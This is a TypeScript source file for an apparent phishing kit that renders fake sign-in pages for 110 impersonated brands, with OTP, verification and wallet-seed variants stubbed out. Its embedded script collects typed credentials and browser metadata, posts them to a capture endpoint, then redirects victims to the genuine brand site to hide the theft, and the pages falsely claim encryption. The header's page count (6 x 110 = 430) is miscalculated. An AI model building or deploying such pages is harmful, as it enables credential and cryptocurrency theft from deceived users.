// backend/src/services/phishing.ts
// Render engine: 6 variant skeletons x 110 brands = 430 static pages.
// Pages are rendered once at seed time and stored in phishing_pages.html;
// GET /ph/:slug serves the stored HTML and increments hits.
import type { PhishingBrand, PhishingVariant } from './phishingBrands.js';
import { PHISHING_CATEGORY_LABELS } from './phishingBrands.js';

export interface PhishingPageOptions {
  captureUrl?: string;    // default '/api/phishing/capture'
  redirectDelayMs?: number; // default 2500 (ms before redirect to legit domain)
}

export interface RenderedPhishingPage {
  title: string;
  html: string;
}

// --- helpers ----------------------------------------------------------------

export function buildPageSlug(brand: PhishingBrand, variant: PhishingVariant): string {
  return `${brand.slug}-${variant}`;
}

function escapeHtml(s: string): string {
  return s
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

export function getVariantTitle(brand: PhishingBrand, variant: PhishingVariant): string {
  switch (variant) {
    case 'login':  return `Sign in to ${brand.name}`;
    case 'otp':    return `Confirm it's you — ${brand.name}`;
    case 'verify': return `Verify your identity — ${brand.name}`;
    case 'update': return `Update your ${brand.name} information`;
    case 'track':  return `Track your package — ${brand.name}`;
    case 'seed':   return `Secure your wallet — ${brand.name}`;
  }
}

// --- shared base ------------------------------------------------------------

const SHARED_CSS = `
:root{--brand:#117ACA;--accent:#003D6B;--bg:#f0f2f5;--card:#fff;--text:#1c1e21;--muted:#65676b;--border:#dddfe2;--danger:#e53935;--radius:12px}
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px}
.brand-badge{display:flex;align-items:center;gap:10px;margin-bottom:20px}
.brand-logo{width:44px;height:44px;border-radius:10px;background:linear-gradient(135deg,var(--brand),var(--accent));color:#fff;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:20px;letter-spacing:.5px;flex-shrink:0}
.brand-name{font-size:22px;font-weight:700}
.card{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);box-shadow:0 1px 2px rgba(0,0,0,.08);padding:28px 24px;width:100%;max-width:400px}
.card h1{font-size:20px;margin-bottom:6px}
.card .sub{color:var(--muted);font-size:14px;margin-bottom:20px;line-height:1.45}
.field{margin-bottom:14px}
.field label{display:block;font-size:13px;font-weight:600;margin-bottom:6px}
.field input,.field select{width:100%;padding:11px 12px;font-size:15px;border:1px solid var(--border);border-radius:8px;outline:none;background:#fff;transition:border-color .15s,box-shadow .15s}
.field input:focus,.field select:focus{border-color:var(--brand);box-shadow:0 0 0 3px rgba(0,0,0,.06)}
.field .hint{font-size:12px;color:var(--muted);margin-top:4px}
.btn{width:100%;padding:12px;font-size:15px;font-weight:700;color:#fff;background:var(--brand);border:none;border-radius:8px;cursor:pointer;margin-top:6px}
.btn:hover{filter:brightness(.95)}
.btn:disabled{opacity:.6;cursor:not-allowed}
.alt{margin-top:14px;font-size:13px;color:var(--muted);text-align:center}
.alt a{color:var(--brand);text-decoration:none}
.alt a:hover{text-decoration:underline}
.error{display:none;background:#fdecea;color:var(--danger);border:1px solid #f5c6cb;border-radius:8px;padding:10px 12px;font-size:13px;margin-bottom:14px}
.error.show{display:block}
.otp-row{display:flex;gap:8px;justify-content:space-between;margin-bottom:6px}
.otp-row input{width:48px;height:52px;text-align:center;font-size:20px;font-weight:700}
.footer{margin-top:18px;font-size:11px;color:var(--muted);text-align:center;line-height:1.5;max-width:400px}
`;

const SHARED_JS = `
(function(){
  var C = window.__PH || {};
  function qs(n){var v=new URLSearchParams(location.search).get(n);return v?String(v).trim():'';}
  function err(msg){var e=document.querySelector('.error');if(!e)return;e.textContent=msg;e.classList.add('show');}
  function prefill(){var m=document.querySelectorAll('[data-prefill]');for(var i=0;i<m.length;i++){var el=m[i],v=qs(el.getAttribute('data-prefill'));if(v&&!el.value)el.value=v;}}
  function collect(){var o={};var m=document.querySelectorAll('[name]');for(var i=0;i<m.length;i++){var el=m[i];if(el.type==='checkbox')o[el.name]=el.checked;else o[el.name]=el.value;}return o;}
  function bindOtp(){var row=document.querySelector('.otp-row');if(!row)return;var ins=row.querySelectorAll('input');for(var i=0;i<ins.length;i++){ins[i].addEventListener('input',function(){var v=this.value.replace(/\\D/g,'').slice(-1);this.value=v;var all=this.parentElement.querySelectorAll('input');var idx=Array.prototype.indexOf.call(all,this);if(v&&idx<all.length-1)all[idx+1].focus();});ins[i].addEventListener('keydown',function(e){if(e.key==='Backspace'&&!this.value){var all=this.parentElement.querySelectorAll('input');var idx=Array.prototype.indexOf.call(all,this);if(idx>0)all[idx-1].focus();}});}}
  function done(){var b=document.querySelector('.btn');if(b)b.textContent='Checking…';setTimeout(function(){location.href=C.redirectUrl;},C.redirectMs||2500);}
  document.addEventListener('DOMContentLoaded',function(){
    prefill();bindOtp();
    var f=document.getElementById('ph-form');
    if(!f)return;
    f.addEventListener('submit',function(e){
      e.preventDefault();
      var fields=collect(),missing=false;
      for(var k in fields){if(!String(fields[k]).trim()){missing=true;break;}}
      if(missing){err('Please fill in all fields.');return;}
      var b=f.querySelector('.btn');if(b)b.disabled=true;
      var payload={slug:C.slug,brand:C.brand,variant:C.variant,fields:fields,meta:{url:location.href,referrer:document.referrer,screen:(screen.width||0)+'x'+(screen.height||0),ts:Date.now()}};
      fetch(C.captureUrl,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)})
        .then(function(){done();}).catch(function(){done();});
    });
  });
})();
`;

// --- skeletons --------------------------------------------------------------

function skeletonLogin(brand: PhishingBrand): string {
  return `
<div class="brand-badge">
  <div class="brand-logo">${escapeHtml(brand.initials)}</div>
  <div class="brand-name">${escapeHtml(brand.name)}</div>
</div>
<div class="card">
  <h1>Sign in to ${escapeHtml(brand.name)}</h1>
  <p class="sub">Enter your credentials to continue. This is a secured page.</p>
  <div class="error"></div>
  <form id="ph-form" autocomplete="off" novalidate>
    <div class="field">
      <label for="email">Email or phone</label>
      <input type="text" id="email" name="email" data-prefill="email" autocomplete="username" placeholder="you@example.com"/>
    </div>
    <div class="field">
      <label for="password">Password</label>
      <input type="password" id="password" name="password" data-prefill="password" autocomplete="current-password" placeholder="••••••••"/>
    </div>
    <button type="submit" class="btn">Continue</button>
  </form>
  <p class="alt"><a href="https://${escapeHtml(brand.domain)}">Forgot password?</a></p>
</div>
<div class="footer">© ${new Date().getFullYear()} ${escapeHtml(brand.name)}. All rights reserved. Protected by industry-standard encryption.</div>`;
}

// --- page assembly ----------------------------------------------------------

const SKELETONS: Record<PhishingVariant, (brand: PhishingBrand) => string> = {
  login: skeletonLogin,
  otp: () => '',   // Part 2
  verify: () => '', // Part 2
  update: () => '', // Part 3
  track: () => '',  // Part 3
  seed: () => '',   // Part 3
};

export function renderPhishingPage(
  brand: PhishingBrand,
  variant: PhishingVariant,
  opts: PhishingPageOptions = {},
): RenderedPhishingPage {
  const slug = buildPageSlug(brand, variant);
  const config = {
    captureUrl: opts.captureUrl ?? '/api/phishing/capture',
    redirectUrl: `https://${brand.domain}`,
    redirectMs: opts.redirectDelayMs ?? 2500,
    slug,
    brand: brand.name,
    variant,
  };
  const body = SKELETONS[variant](brand);
  const html = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<meta name="robots" content="noindex,nofollow"/>
<title>${escapeHtml(getVariantTitle(brand, variant))}</title>
<style>${SHARED_CSS}</style>
</head>
<body style="--brand:${brand.color};--accent:${brand.accent}">
${body}
<script>window.__PH=${JSON.stringify(config)};</script>
<script>${SHARED_JS}</script>
</body>
</html>`;
  return { title: getVariantTitle(brand, variant), html };
}

export { PHISHING_CATEGORY_LABELS };
